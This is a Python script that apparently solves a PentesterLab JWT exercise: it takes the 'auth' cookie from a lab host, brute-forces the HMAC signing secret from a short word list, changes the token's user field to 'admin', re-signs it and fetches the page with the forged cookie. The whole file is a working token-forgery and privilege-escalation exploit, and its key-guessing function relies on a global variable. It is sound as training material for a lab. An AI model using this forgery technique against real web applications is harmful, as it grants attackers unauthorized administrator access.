import requests
import base64, json
import hmac,hashlib

indexurl = 'http://ptl-13805eba-00a14845.libcurl.so/'

words = ['hacker','jwt','insecurity','pentesterlab','hacking']

session = requests.Session()
s = session.get(indexurl)

token = session.cookies['auth']

header,payload,signature = token.split('.')

def sign_gen(key,str):
	new_signature = base64.urlsafe_b64encode(hmac.new(key.encode('utf-8'),sign.encode('utf-8'),hashlib.sha256).digest()).decode('utf-8').rstrip('=')
	return new_signature

sign = header+'.'+payload

for key in words:
	if signature == sign_gen(key,sign):
		print('Key is : ',key)
		break

payload += '='*(8 - (len(payload)%8))

payload_d = json.loads(base64.urlsafe_b64decode(payload).decode('utf-8'))
payload_d['user'] = 'admin'
payload = base64.urlsafe_b64encode(json.dumps(payload_d).encode('utf-8')).decode('utf-8').rstrip('=')

sign = header+'.'+payload

session.cookies['auth'] = sign+'.'+sign_gen(key,sign)

s = session.get(indexurl)
print(s.text)
